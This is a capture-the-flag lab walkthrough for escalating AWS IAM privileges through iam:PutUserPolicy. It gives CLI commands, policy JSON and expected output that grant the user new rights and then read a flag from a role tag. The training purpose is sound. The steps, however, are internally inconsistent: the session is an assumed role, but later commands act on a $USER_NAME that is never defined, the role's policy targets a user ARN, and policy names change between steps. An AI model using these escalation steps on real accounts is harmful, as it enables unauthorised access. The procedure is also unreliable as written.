# Walkthrough: PutUserPolicy Privilege Escalation

## Lab Objective

Learn how to identify and exploit the `iam:PutUserPolicy` permission to escalate privileges and retrieve a flag stored as an IAM role tag.

## Scenario

You have been provided with access to an entry role with limited permissions. Your goal is to use the `iam:PutUserPolicy` permission to escalate your privileges and access the flag.

## Prerequisites

- AWS CLI installed and configured
- Role ARN from the lab deployment
- Basic understanding of AWS IAM policies

## Setup

### Step 1: Assume the Lab Entry Role

Assume the lab entry role using the role ARN provided by the lab deployment:

```bash
# Replace with your specific role ARN from the deployment output
ROLE_ARN="arn:aws:iam::ACCOUNT_ID:role/specter-lab-putuserpolicy-entry"

# Assume the role and get temporary credentials
CREDS=$(aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name lab-session --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text)

# Export the temporary credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | awk '{print $1}')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | awk '{print $2}')
export AWS_SESSION_TOKEN=$(echo $CREDS | awk '{print $3}')
export AWS_DEFAULT_REGION="us-east-1"
```

Verify your identity:

```bash
aws sts get-caller-identity | jq
```

Expected output:
```json
{
  "UserId": "AROA...:lab-session",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/specter-lab-putuserpolicy-entry/lab-session"
}
```

Note that your ARN shows `assumed-role` indicating you're using temporary credentials from the entry role.

## Reconnaissance

### Step 2: Discover Your Permissions

Check what inline policies are attached to your role:

```bash
# Extract the role name from your assumed role session
ROLE_NAME=$(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
echo "Current role: $ROLE_NAME"

# List inline policies
aws iam list-role-policies --role-name $ROLE_NAME | jq
```

Expected output:
```json
{
    "PolicyNames": [
        "specter-lab-putuserpolicy-entry-policy"
    ]
}
```

### Step 3: Examine Current Policy

Get the current inline policy document:

```bash
aws iam get-role-policy --role-name $ROLE_NAME --policy-name specter-lab-putuserpolicy-entry-policy | jq
```

You should see the policy document showing:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DescribeSelf",
      "Effect": "Allow",
      "Action": [
        "iam:GetUser",
        "iam:ListUserPolicies",
        "iam:GetUserPolicy",
        "iam:ListAttachedUserPolicies"
      ],
      "Resource": "arn:aws:iam::ACCOUNT_ID:user/${aws:username}"
    },
    {
      "Sid": "EscalationVector",
      "Effect": "Allow",
      "Action": ["iam:PutUserPolicy"],
      "Resource": "arn:aws:iam::ACCOUNT_ID:user/${aws:username}"
    }
  ]
}
```

**Key Finding**: You have `iam:PutUserPolicy` permission on your own user account!

### Step 4: Try to Access the Flag (Will Fail)

First, try to access the flag with your current permissions:

```bash
aws iam get-role --role-name specter-lab-putuserpolicy-flag-holder --query 'Role.Tags[?Key==`flag`].Value' | jq
```

Expected error:
```
An error occurred (AccessDenied) when calling the GetRole operation: User: ... is not authorized to perform: iam:GetRole
```

This confirms you don't currently have access to the flag.

## Exploitation

### Step 5: Create an Escalated Policy Document

Create a new policy document called `escalated-policy.json` that grants you elevated permissions:

```bash
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DescribeSelf",
      "Effect": "Allow",
      "Action": [
        "iam:GetUser",
        "iam:ListUserPolicies",
        "iam:GetUserPolicy",
        "iam:ListAttachedUserPolicies"
      ],
      "Resource": "arn:aws:iam::*:user/${aws:username}"
    },
    {
      "Sid": "EscalationVector",
      "Effect": "Allow",
      "Action": ["iam:PutUserPolicy"],
      "Resource": "arn:aws:iam::*:user/${aws:username}"
    },
    {
      "Sid": "ReadFlagFromRoleTags",
      "Effect": "Allow",
      "Action": [
        "iam:GetRole",
        "iam:ListRoleTags",
        "iam:ListRoles"
      ],
      "Resource": "*"
    }
  ]
}
```

### Step 6: Apply the Escalated Policy

Use `iam:PutUserPolicy` to update your inline policy with escalated permissions:

```bash
aws iam put-user-policy --user-name $USER_NAME   --policy-name specter-lab-putuserpolicy-initial   --policy-document file://escalated-policy.json
```

Expected output: (no output means success)

### Step 7: Verify the Escalation

Check that the policy has been updated:

```bash
aws iam get-user-policy --user-name $USER_NAME --policy-name specter-lab-putuserpolicy-initial | jq
```

You should see the new policy document with the elevated permissions.

## Capture the Flag

### Step 8: Retrieve the Flag

Now that you have escalated privileges, retrieve the flag:

```bash
aws iam get-role --role-name specter-lab-putuserpolicy-flag-holder --query 'Role.Tags[?Key==`flag`].Value' | jq
```

Expected output:
```
SPECTER:put_us3r_p0l1cy_3sc4l4t10n
```

## Understanding the Attack

### Why This Works

1. **Inline Policy Modification**: You had permission to modify inline policies on your own user
2. **Self-Modification**: The resource was scoped to `${aws:username}`, which resolved to your own user
3. **Immediate Effect**: Inline policy changes take effect immediately
4. **No Restrictions**: There were no permission boundaries or conditions limiting what you could grant yourself

### Attack Flow

```
Entry Role (limited permissions)
    |
    | iam:PutUserPolicy on target user
    |
Updated User Inline Policy (elevated permissions)
    |
    | Use updated user credentials
    |
    | iam:GetRole on flag holder
    |
Flag Retrieved!
```

## Additional Resources

- [AWS IAM PutUserPolicy](https://docs.aws.amazon.com/IAM/latest/APIReference/API_PutUserPolicy.html)
- [IAM Inline vs Managed Policies](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html)
- [Permission Boundaries](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html)
- [Rhino Security Labs: AWS Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)